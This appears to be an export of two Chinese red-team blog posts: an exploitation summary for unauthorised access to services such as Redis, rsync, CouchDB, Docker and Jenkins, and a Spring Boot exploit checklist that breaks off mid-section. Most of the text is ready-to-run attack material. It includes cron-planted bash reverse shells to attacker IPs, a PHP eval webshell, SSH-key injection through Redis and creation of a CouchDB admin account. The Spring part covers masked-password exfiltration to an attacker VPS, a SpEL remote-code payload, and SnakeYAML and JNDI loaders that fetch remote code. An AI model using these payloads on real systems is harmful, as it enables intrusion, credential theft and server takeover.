[{"content":"总结目前开发和运维架构中，常用的应用未授权访问漏洞利用方式。包含MongoDB、nfs、ZooKeeper、Memcache、Elasticsearch、docker、Hadoop、CouchDB、RedisJenkins、rsync等。\n一、MongoDB MongoDB默认端口27017，当配置成无验证时，存在未授权访问，使用msf中的scanner/mongodb/mongodb_login模块进行测试，使用navicat连接获取数据库中的内容。\nuse auxiliary/scanner/mongodb/mongodb_login set rhosts 192.168.90.0/24 set threads 10 exploit  二、nfs nfs默认端口2049，配置不当时，可以远程挂载nfs的共享目录。\napt install nfs-common 安装nfs客户端 showmount -e 192.168.70.162 查看nfs服务器上的共享目录 mount -t nfs 192.168.70.162:/grdata /mnt 挂载到本地 umount /mnt 卸载目录  三、ZooKeeper ZooKeeper是一个分布式的，开放源码的应用程序协调服务，默认端口2181，在未进行任何访问控制的情况下，存在未授权访问漏洞。\necho envi|nc 192.168.80.196 2181 列出服务环境有关的信息 echo stat|nc 192.168.80.196 2181 列出关于性能和连接的客户端统计信息  四、Memcache memcache是一套分布式的高速缓存系统，它以Key-Value（键值对）形式将数据存储在内存中，默认开放11211端口，使用nmap的脚本进行扫描。\nnmap 192.168.70.129 -p11211 --script=\u0026quot;memcached-info.nse\u0026quot;  使用nc连接获取敏感信息\n stats 查看memcache 服务状态 stats items 查看所有items  五、Elasticsearch Elasticsearch是用Java开发的企业级搜索引擎，默认端口9200，存在未授权访问漏洞时，可被非法操作数据。\nhttp://192.168.80.126:9200/_plugin/head/ web管理界面 http://192.168.80.126:9200/_cat/indices 查看集群当前状态 http://192.168.80.126:9200/_nodes 查看节点数据 http://192.168.80.126:9200/_river/_search 查看数据库敏感信息  六、docker 该未授权访问漏洞是因为docker remote api可以执行docker命令，该接口的目的是取代docker命令界面，通过url操作docker。docker swarm是用来管理docker集群的，在开放2375端口监听集群容器时，会调用这个api。\n#安装类库 pip install -r requirements.txt #查看运行的容器 python dockerRemoteApiGetRootShell.py -h 192.168.80.221 -p 2375 #查看所有的容器 python dockerRemoteApiGetRootShell.py -h 192.168.80.221 -p 2375 -a #查看端口映射 python dockerRemoteApiGetRootShell.py -h 192.168.80.221 -p 2375 -L #在容器中执行命令 python dockerRemoteApiGetRootShell.py -h 192.168.80.221 -p 2375 -e \u0026quot;whoami\u0026quot; -I 容器id #查看服务端api版本 python dockerRemoteApiGetRootShell.py -h 192.168.80.221 -p 2375 -V  工具：https://github.com/Tycx2ry/docker_api_vul\n七、Hadoop Hadoop是一个由Apache基金会所开发的分布式系统基础架构，Hadoop YARN ResourceManager WebUI页面如下：\n在没有 hadoop client 的情况下，直接通过 REST API也可以提交任务执行。利用过程如下：\n 在本地监听等待反弹 shell 连接 调用 New Application API 创建 Application 调用 Submit Application API 提交  工具：https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py\n八、CouchDB CouchDB是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库，2017年时被爆出了2个CVE：\n CVE-2017-12635垂直权限绕过 发送如下数据包，可成功创建管理员用户，账户密码均为vulhub，web界面登录地址为：http://192.168.70.45:5984/_utils/  PUT /_users/org.couchdb.user:vulhub HTTP/1.1 Host: 192.168.70.45:5984 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/json Content-Length: 108 { \u0026quot;type\u0026quot;: \u0026quot;user\u0026quot;, \u0026quot;name\u0026quot;: \u0026quot;vulhub\u0026quot;, \u0026quot;roles\u0026quot;: [\u0026quot;_admin\u0026quot;], \u0026quot;roles\u0026quot;: [], \u0026quot;password\u0026quot;: \u0026quot;vulhub\u0026quot; }   CVE-2017-12636任意命令执行 Couchdb 2.x和1.x的API接口有一定区别，所以这个漏洞的利用方式也不同。使用以下exp，修改其中的target和command为你的测试机器，然后修改version为对应的Couchdb版本（1或2），可成功反弹shell。  工具：https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py\n九、Redis Redis安装完成后，默认是没有账号密码的，如果配置不当可能造成未授权访问漏洞。主要有以下三种利用方式：\n 写ssh公钥，需要root权限 利用过程：  ssh-keygen -t rsa 生成ssh公钥和私钥 (echo -e \u0026quot;\\n\\n\u0026quot;; cat id_rsa.pub; echo -e \u0026quot;\\n\\n\u0026quot;) \u0026gt; key.txt 将公钥保存成key.txt cat /root/.ssh/key.txt | redis-cli -h 192.168.80.44 -x set xxx 写入redis redis-cli -h 192.168.80.44 连接redis config set dir /root/.ssh 设置写文件的目录 config set dbfilename authorized_keys 设置写入的文件名 save  使用ssh远程登录：\nssh root@192.168.80.44 -p 22622   写定时任务，需要root权限 利用过程：  redis-cli -h 192.168.80.44 set xxx \u0026quot;\\n\\n*/1 * * * * /bin/bash -i\u0026gt;\u0026amp;/dev/tcp/192.168.40.155/4444 0\u0026gt;\u0026amp;1\\n\\n\u0026quot; config set dir /var/spool/cron 设置写文件的目录 config set dbfilename root 设置写入的文件名 save  使用nc接收shell：\nnc -nvvlp 4444  补充：可利用cron的位置\n/etc/crontab /etc/cron.d/ /var/spool/cron/root为centos系统root用户的cron文件 /var/spool/cron/crontabs/root为debian系统root用户的cron文件   写webshell，需要知道web路径 利用过程：  redis-cli -h 192.168.80.44 config set dir /var/www/html set xxx \u0026quot;\\n\\n\\n\u0026lt;?php@eval($_POST['c']);?\u0026gt;\\n\\n\\n\u0026quot; config set dbfilename webshell.php save  4.利用主从复制getshell root用户会收到root的shell，redis用户会收到redis的shell。\ngit clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand cd RedisModules-ExecuteCommand/ make git clone https://github.com/Ridter/redis-rce python redis-rce.py -r 192.168.80.147 -L 192.168.80.166 -f module.so  nc -nvvlp 81 服务器上监听81端口  5.Windows下如何getshell？\n 写入webshell，需要知道web路径 写入启动项，需要目标服务器重启 写入MOF，MOF每隔5秒钟会自动执行一次，适用于Windows2003。  补充：redis常用命令\ninfo、keys *、set animal 'Cat'、get animal、del animal、config get dir、config get dbfilename  十、Jenkins 默认情况下 Jenkins 面板中可以使用脚本命令行，攻击者通过未授权访问漏洞执行系统命令从而获取服务器的权限。\nhttp://www.example.com:8080/manage http://www.example.com:8080/script    执行系统命令：\nprintln \u0026quot;ls\u0026quot;.execute().text\n   反弹shell  十一、rsync  查看模块名列表  root@kali:~# nmap 192.168.80.201 -p 873 -n -Pn --script=\u0026quot;rsync-list-modules.nse\u0026quot; root@kali:~# rsync rsync://192.168.80.201:873/   查看模块下的文件  root@kali:~# rsync rsync://192.168.80.201:873/src/   下载任意文件  root@kali:~# rsync -av rsync://192.168.80.201:873/src/etc/passwd ./   通过写文件getshell   写入webshell  root@kali:~# rsync -av webshell.php rsync://192.168.80.201:873/src/var/webshell.php   写入定时任务 首先查看当前有哪些定时任务：  root@kali:~# rsync -av rsync://192.168.80.201:873/src/etc/crontab ./ root@kali:~# cat crontab  然后创建一个shell文件\nroot@kali:~# vim shell #!/bin/bash /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.80.221/4444 0\u0026gt;\u0026amp;1 root@kali:~# chmod +x shell  最后将shell文件写入定时任务(注意每小时的第17分钟会执行)\nroot@kali:~# rsync -av shell rsync://192.168.80.201:873/src/etc/cron.hourly  参考： https://vulhub.org\nhttps://paper.seebug.org/409/#0x02-redis\nhttps://xz.aliyun.com/t/2320#toc-42\n  作者：Instu 链接：https://www.jianshu.com/p/40fbd63cf982\n","date":"2020-08-11","permalink":"https://xeye.io/post/%E5%B8%B8%E8%A7%81%E5%BA%94%E7%94%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/","tags":["红队"],"title":"常见应用未授权访问漏洞利用总结"},{"content":"Spring Boot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list\n声明  ⚠️ 本项目所有内容仅作为安全研究和授权测试使用, 相关人员对因误用和滥用该项目造成的一切损害概不负责\n 目录  Spring Boot Vulnerability Exploit CheckList  零：路由和版本  0x01：路由知识 0x02：版本知识  常见组件的版本相互依赖关系： Spring Cloud 与 Spring Boot 大版本之间的依赖关系： Spring Cloud 小版本号的后缀及含义:     一：信息泄露  0x01：路由地址及接口调用详情泄漏 0x02：配置不当而暴露的路由 0x03：获取被星号脱敏的密码的明文 (方法一)  利用条件： 利用方法：  步骤一： 找到想要获取的属性名 步骤二： jolokia 调用相关 Mbean 获取明文     0x04：获取被星号脱敏的密码的明文 (方法二)  利用条件： 利用方法：  步骤一： 找到想要获取的属性名 步骤二： 使用 nc 监听 HTTP 请求 步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性 步骤四： 刷新配置 步骤五： 解码属性值     0x05：获取被星号脱敏的密码的明文 (方法三)  利用条件： 利用方法：  步骤一： 找到想要获取的属性名 步骤二： 使用 nc 监听 HTTP 请求 步骤三： 触发对外 http 请求 步骤四： 刷新配置     0x06：获取被星号脱敏的密码的明文 (方法四)  利用条件： 利用方法：  步骤一： 找到想要获取的属性名 步骤二： 下载 jvm heap 信息 步骤三： 使用 MAT 获得 jvm heap 中的密码明文       二：远程代码执行  0x01：whitelabel error page SpEL RCE  利用条件： 利用方法：  步骤一：找到一个正常传参处 步骤二：执行 SpEL 表达式   漏洞原理： 漏洞分析： 漏洞环境：   0x02：spring cloud SnakeYAML RCE  利用条件： 利用方法：  步骤一： 托管 yml 和 jar 文件 步骤二： 设置 spring.cloud.bootstrap.location 属性 步骤三： 刷新配置   漏洞原理： 漏洞分析： 漏洞环境：   0x03：eureka xstream deserialization RCE  利用条件： 利用方法：  步骤一：架设响应恶意 XStream payload 的网站 步骤二：监听反弹 shell 的端口 步骤三：设置 eureka.client.serviceUrl.defaultZone 属性 步骤四：刷新配置   漏洞原理： 漏洞分析： 漏洞环境：   0x04：jolokia logback JNDI RCE  利用条件： 利用方法：  步骤一：查看已存在的 MBeans 步骤二：托管 xml 文件 步骤三：准备要执行的 Java 代码 步骤四：架设恶意 ldap 服务 步骤五：监听反弹 shell 的端口 步骤六：从外部 URL 地址加载日志配置文件   漏洞原理： 漏洞分析： 漏洞环境：   0x05：jolokia Realm JNDI RCE  利用条件： 利用方法：  步骤一：查看已存在的 MBeans 步骤二：准备要执行的 Java 代码 步骤三：托管 class 文件 步骤四：架设恶意 rmi 服务 步骤五：监听反弹 shell 的端口 步骤六：发送恶意 payload   漏洞原理： 漏洞分析： 漏洞环境：   0x06：h2 database query RCE  利用条件： 利用方法：  步骤一：设置 spring.datasource.hikari.connection-test-query 属性 步骤二：重启应用   漏洞原理： 漏洞分析： 漏洞环境：   0x07：h2 database console JNDI RCE  利用条件： 利用方法：  步骤一：访问路由获得 jsessionid 步骤二：准备要执行的 Java 代码 步骤三：托管 class 文件 步骤四：架设恶意 ldap 服务 步骤五：监听反弹 shell 的端口 步骤六：发包触发 JNDI 注入   漏洞分析： 漏洞环境：   0x08：mysql jdbc deserialization RCE  利用条件： 利用方法：  步骤一：查看环境依赖 步骤二：架设恶意 rogue mysql server 步骤三：设置 spring.datasource.url 属性 步骤四：刷新配置 步骤五：触发数据库查询 步骤六：恢复正常 jdbc url   漏洞原理： 漏洞分析： 漏洞环境：        零：路由和版本 0x01：路由知识  Spring Boot 1.x 版本默认内置路由的根路径以 / 开始，2.x 则统一以 /actuator 开始 有些程序员会自定义 /manage、/management 或 项目相关名称 为根路径 默认内置路由名字，如 /env 有时候也会被程序员修改，如修改成 /appenv  0x02：版本知识  Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。\n 常见组件的版本相互依赖关系：    依赖项 版本列表及依赖组件版本     spring-boot-starter-parent spring-boot-starter-parent   spring-boot-dependencies spring-boot-dependencies   spring-cloud-dependencies spring-cloud-dependencies    Spring Cloud 与 Spring Boot 大版本之间的依赖关系：    Spring Cloud Spring Boot     Angel 兼容 Spring Boot 1.2.x   Brixton 兼容 Spring Boot 1.3.x、1.4.x   Camden 兼容 Spring Boot 1.4.x、1.5.x   Dalston 兼容 Spring Boot 1.5.x，不兼容 2.0.x   Edgware 兼容 Spring Boot 1.5.x，不兼容 2.0.x   Finchley 兼容 Spring Boot 2.0.x，不兼容 1.5.x   Greenwich 兼容 Spring Boot 2.1.x   Hoxton 兼容 Spring Boot 2.2.x    Spring Cloud 小版本号的后缀及含义:    版本号后缀 含义     BUILD-SNAPSHOT 快照版，代码不是固定，处于变化之中   MX 里程碑版   RCX 候选发布版   RELEASE 正式发布版   SRX (修复错误和 bug 并再次发布的)正式发布版    一：信息泄露 0x01：路由地址及接口调用详情泄漏  开发环境切换为线上生产环境时，相关人员没有更改配置文件或忘记切换配置环境，导致此漏洞\n 直接访问以下几个路由，验证漏洞是否存在：\n/api-docs /v2/api-docs /swagger-ui.html  一些可能会遇到的接口路由变形：\n/api.html /sw/swagger-ui.html /api/swagger-ui.html /template/swagger-ui.html /spring-security-rest/api/swagger-ui.html /spring-security-oauth-resource/swagger-ui.html  除此之外，下面的路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：\n/mappings /actuator/mappings /metrics /actuator/metrics /beans /actuator/beans /configprops /actuator/configprops  一般来讲，知道 spring boot 应用的相关接口和传参信息并不能算是漏洞；\n但是可以检查暴露的接口是否存在未授权访问、越权或者其他业务型漏洞。\n0x02：配置不当而暴露的路由  主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置\n 参考 production-ready-endpoints 和 spring-boot.txt，可能因为配置不当而暴露的默认内置路由可能会有：\n/actuator /auditevents /autoconfig /beans /caches /conditions /configprops /docs /dump /env /flyway /health /heapdump /httptrace /info /intergrationgraph /jolokia /logfile /loggers /liquibase /metrics /mappings /prometheus /refresh /scheduledtasks /sessions /shutdown /trace /threaddump /actuator/auditevents /actuator/beans /actuator/health /actuator/conditions /actuator/configprops /actuator/env /actuator/info /actuator/loggers /actuator/heapdump /actuator/threaddump /actuator/metrics /actuator/scheduledtasks /actuator/httptrace /actuator/mappings /actuator/jolokia /actuator/hystrix.stream  其中对寻找漏洞比较重要接口的有：\n  /env、/actuator/env\nGET 请求 /env 会泄露环境变量信息，或者配置中的一些用户名，当程序员的属性名命名不规范 (例如 password 写成 psasword、pwd) 时，会泄露密码明文；\n同时有一定概率可以通过 POST 请求 /env 接口设置一些属性，触发相关 RCE 漏洞。\n  /jolokia\n通过 /jolokia/list 接口寻找可以利用的 MBean，触发相关 RCE 漏洞；\n  /trace\n一些 http 请求包访问跟踪信息，有可能发现有效的 cookie 信息\n  0x03：获取被星号脱敏的密码的明文 (方法一)  访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果\n 利用条件：  目标网站存在 /jolokia 或 /actuator/jolokia 接口 目标使用了 jolokia-core 依赖（版本要求暂未知）  利用方法： 步骤一： 找到想要获取的属性名 GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。\n步骤二： jolokia 调用相关 Mbean 获取明文 将下面示例中的 security.user.password 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 value 键中。\n 调用 org.springframework.boot Mbean（可能更通用）   实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法\n spring 1.x\nPOST /jolokia Content-Type: application/json {\u0026quot;mbean\u0026quot;: \u0026quot;org.springframework.boot:name=SpringApplication,type=Admin\u0026quot;,\u0026quot;operation\u0026quot;: \u0026quot;getProperty\u0026quot;, \u0026quot;type\u0026quot;: \u0026quot;EXEC\u0026quot;, \u0026quot;arguments\u0026quot;: [\u0026quot;security.user.password\u0026quot;]}  spring 2.x\nPOST /actuator/jolokia Content-Type: application/json {\u0026quot;mbean\u0026quot;: \u0026quot;org.springframework.boot:name=SpringApplication,type=Admin\u0026quot;,\u0026quot;operation\u0026quot;: \u0026quot;getProperty\u0026quot;, \u0026quot;type\u0026quot;: \u0026quot;EXEC\u0026quot;, \u0026quot;arguments\u0026quot;: [\u0026quot;security.user.password\u0026quot;]}   调用 org.springframework.cloud.context.environment Mbean（需要 spring cloud 相关依赖）   实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法\n spring 1.x\nPOST /jolokia Content-Type: application/json {\u0026quot;mbean\u0026quot;: \u0026quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\u0026quot;,\u0026quot;operation\u0026quot;: \u0026quot;getProperty\u0026quot;, \u0026quot;type\u0026quot;: \u0026quot;EXEC\u0026quot;, \u0026quot;arguments\u0026quot;: [\u0026quot;security.user.password\u0026quot;]}  spring 2.x\nPOST /actuator/jolokia Content-Type: application/json {\u0026quot;mbean\u0026quot;: \u0026quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\u0026quot;,\u0026quot;operation\u0026quot;: \u0026quot;getProperty\u0026quot;, \u0026quot;type\u0026quot;: \u0026quot;EXEC\u0026quot;, \u0026quot;arguments\u0026quot;: [\u0026quot;security.user.password\u0026quot;]}  0x04：获取被星号脱敏的密码的明文 (方法二)  访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果\n 利用条件：  可以 GET 请求目标网站的 /env 可以 POST 请求目标网站的 /env 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖） 目标使用了 spring-cloud-starter-netflix-eureka-client 依赖 目标可以请求攻击者的服务器（请求可出外网）  利用方法： 步骤一： 找到想要获取的属性名 GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。\n步骤二： 使用 nc 监听 HTTP 请求 在自己控制的外网服务器上监听 80 端口：\nnc -lvk 80  步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性 将下面 http://value:${security.user.password}@your-vps-ip 中的 security.user.password 换成自己想要获取的对应的星号 * 遮掩的属性名；\nyour-vps-ip 换成自己外网服务器的真实 ip 地址。\nspring 1.x\nPOST /env Content-Type: application/x-www-form-urlencoded eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip  spring 2.x\nPOST /actuator/env Content-Type: application/json {\u0026quot;name\u0026quot;:\u0026quot;eureka.client.serviceUrl.defaultZone\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;http://value:${security.user.password}@your-vps-ip\u0026quot;}  步骤四： 刷新配置 spring 1.x\nPOST /refresh Content-Type: application/x-www-form-urlencoded  spring 2.x\nPOST /actuator/refresh Content-Type: application/json  步骤五： 解码属性值 正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 Authorization 头内容：\nAuthorization: Basic dmFsdWU6MTIzNDU2  将其中的 dmFsdWU6MTIzNDU2部分使用 base64 解码，即可获得类似明文值 value:123456，其中的 123456 即是目标星号 * 脱敏前的属性值明文。\n0x05：获取被星号脱敏的密码的明文 (方法三)  访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果\n 利用条件：  通过 POST /env 设置属性触发目标对外网指定地址发起任意 http 请求 目标可以请求攻击者的服务器（请求可出外网）  利用方法：  参考 UUUUnotfound 提出的 issue-1，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据\n 步骤一： 找到想要获取的属性名 GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。\n步骤二： 使用 nc 监听 HTTP 请求 在自己控制的外网服务器上监听 80 端口：\nnc -lvk 80  步骤三： 触发对外 http 请求  spring.cloud.bootstrap.location 方法（同时适用于明文数据中有特殊 url 字符的情况）：  spring 1.x\nPOST /env Content-Type: application/x-www-form-urlencoded spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password}  spring 2.x\nPOST /actuator/env Content-Type: application/json {\u0026quot;name\u0026quot;:\u0026quot;spring.cloud.bootstrap.location\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;http://your-vps-ip/?=${security.user.password}\u0026quot;}   eureka.client.serviceUrl.defaultZone 方法（不适用于明文数据中有特殊 url 字符的情况）：  spring 1.x\nPOST /env Content-Type: application/x-www-form-urlencoded eureka.client.serviceUrl.defaultZone=http://your-vps-ip/${security.user.password}  spring 2.x\nPOST /actuator/env Content-Type: application/json {\u0026quot;name\u0026quot;:\u0026quot;eureka.client.serviceUrl.defaultZone\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;http://your-vps-ip/${security.user.password}\u0026quot;}  步骤四： 刷新配置 spring 1.x\nPOST /refresh Content-Type: application/x-www-form-urlencoded  spring 2.x\nPOST /actuator/refresh Content-Type: application/json  0x06：获取被星号脱敏的密码的明文 (方法四)  访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果\n 利用条件：  可正常 GET 请求目标 /heapdump 或 /actuator/heapdump 接口  利用方法： 步骤一： 找到想要获取的属性名 GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。\n步骤二： 下载 jvm heap 信息  下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G\n GET 请求目标的 /heapdump 或 /actuator/heapdump 接口，下载应用实时的 JVM 堆信息\n步骤三： 使用 MAT 获得 jvm heap 中的密码明文 参考 文章 方法，使用 Eclipse Memory Analyzer 工具的 OQL 语句 select * from org.springframework.web.context.support.StandardServletEnvironment， 辅助快速过滤分析，获得密码明文\n二：远程代码执行  由于 spring boot 相关漏洞可能是多个组件漏洞组合导致的，所以有些漏洞名字起的不太正规，以能区分为准\n 0x01：whitelabel error page SpEL RCE 利用条件：  spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0 至少知道一个触发 springboot 默认错误页面的接口及参数名  利用方法： 步骤一：找到一个正常传参处 比如发现访问 /article?id=xxx ，页面会报状态码为 500 的错误： Whitelabel Error Page，则后续 payload 都将会在参数 id 处尝试。\n步骤二：执行 SpEL 表达式 输入 /article?id=${7*7} ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。\n由字符串格式转换成 0x** java 字节形式，方便执行任意代码：\n# coding: utf-8 result = \u0026quot;\u0026quot; target = 'open -a Calculator' for x in target: result += hex(ord(x)) + \u0026quot;,\u0026quot; print(result.rstrip(','))  执行 open -a Calculator 命令\n${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}  漏洞原理：  spring boot 处理参数值出错，流程进入 org.springframework.util.PropertyPlaceholderHelper 类中 此时 URL 中的参数值会用 parseStringValue 方法进行递归解析 其中 ${} 包围的内容都会被 org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration 类的 resolvePlaceholder 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞  漏洞分析： SpringBoot SpEL表达式注入漏洞-分析与复现\n漏洞环境： repository/springboot-spel-rce\n正常访问：\nhttp://127.0.0.1:9091/article?id=66  执行 open -a Calculator 命令：\nhttp://127.0.0.1:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}  0x02：spring cloud SnakeYAML RCE 利用条件：  可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖） 目标依赖的 spring-cloud-starter 版本 \u0026lt; 1.3.0.RELEASE 目标可以请求攻击者的 HTTP 服务器（请求可出外网）  利用方法： 步骤一： 托管 yml 和 jar 文件 在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）\n# 使用 python 快速开启 http server python2 -m SimpleHTTPServer 80 python3 -m http.server 80  在网站根目录下放置后缀为 yml 的文件 example.yml，内容如下：\n!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\u0026quot;http://your-vps-ip/example.jar\u0026quot;] ]] ]  在网站根目录下放置后缀为 jar 的文件 example.jar，内容是要执行的代码，代码编写及编译方式参考 yaml-payload。\n步骤二： 设置 spring.cloud.bootstrap.location 属性 spring 1.x\nPOST /env Content-Type: application/x-www-form-urlencoded spring.cloud.bootstrap.location=http://your-vps-ip/example.yml  spring 2.x\nPOST /actuator/env Content-Type: application/json {\u0026quot;name\u0026quot;:\u0026quot;spring.cloud.bootstrap.location\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;http://your-vps-ip/example.yml\u0026quot;}  步骤三： 刷新配置 spring 1.x\nPOST /refresh Content-Type: application/x-www-form-urlencoded  spring 2.x\nPOST /actuator/refresh Content-Type: application/json  漏洞原理：  spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址 refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容 SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作 先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件 然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化 实例化类时执行恶意代码，造成 RCE 漏洞  漏洞分析： Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记\n漏洞环境： repository/springcloud-snakeyaml-rce\n正常访问：\nhttp://127.0.0.1:9092/env  0x03：eureka xstream deserialization RCE 利用条件：  可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖） 目标使用的 eureka-client \u0026lt; 1.8.7（通常包含在 spring-cloud-starter-netflix-eureka-client 依赖中） 目标可以请求攻击者的 HTTP 服务器（请求可出外网）  利用方法： 步骤一：架设响应恶意 XStream payload 的网站 提供一个依赖 Flask 并符合要求的 python 脚本示例，作用是利用目标 Linux 机器上自带的 python 来反弹shell。\n使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。\n步骤二：监听反弹 shell 的端口 一般使用 nc 监听端口，等待反弹 shell\nnc -lvp 443  步骤三：设置 eureka.client.serviceUrl.defaultZone 属性 spring 1.x\nPOST /env Content-Type: application/x-www-form-urlencoded eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example  spring 2.x\nPOST /actuator/env Content-Type: application/json {\u0026quot;name\u0026quot;:\u0026quot;eureka.client.serviceUrl.defaultZone\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;http://your-vps-ip/example\u0026quot;}  步骤四：刷新配置 spring 1.x\nPOST /refresh Content-Type: application/x-www-form-urlencoded  spring 2.x\nPOST /actuator/refresh Content-Type: application/json  漏洞原理：  eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址 refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload 目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞  漏洞分析： Spring Boot Actuator从未授权访问到getshell\n漏洞环境： repository/springboot-eureka-xstream-rce\n正常访问：\nhttp://127.0.0.1:9093/env  0x04：jolokia logback JNDI RCE 利用条件：  目标网站存在 /jolokia 或 /actuator/jolokia 接口 目标使用了 jolokia-core 依赖（版本要求暂未知）并且环境中存在相关 MBean 目标可以请求攻击者的 HTTP 服务器（请求可出外网） JNDI 注入受目标 JDK 版本影响，jdk \u0026lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）  利用方法： 步骤一：查看已存在的 MBeans 访问 /jolokia/list 接口，查看是否存在 ch.qos.logback.classic.jmx.JMXConfigurator 和 reloadByURL 关键词。\n步骤二：托管 xml 文件 在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）\n# 使用 python 快速开启 http server python2 -m SimpleHTTPServer 80 python3 -m http.server 80  在根目录放置以 xml 结尾的 example.xml 文件，内容如下：\n\u0026lt;configuration\u0026gt; \u0026lt;insertFromJNDI env-entry-name=\u0026quot;ldap://your-vps-ip:1389/JNDIObject\u0026quot; as=\u0026quot;appName\u0026quot; /\u0026gt; \u0026lt;/configuration\u0026gt;  步骤三：准备要执行的 Java 代码 编写优化过后的用来反弹 shell 的 Java 示例代码 JNDIObject.java，\n使用兼容低版本 jdk 的方式编译：\njavac -source 1.5 -target 1.5 JNDIObject.java  然后将生成的 JNDIObject.class 文件拷贝到 步骤二 中的网站根目录。\n步骤四：架设恶意 ldap 服务 下载 marshalsec ，使用下面命令架设对应的 ldap 服务：\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389  步骤五：监听反弹 shell 的端口 一般使用 nc 监听端口，等待反弹 shell\nnc -lv 443  步骤六：从外部 URL 地址加载日志配置文件  ⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。\n 替换实际的 your-vps-ip 地址访问 URL 触发漏洞：\n/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml  漏洞原理： 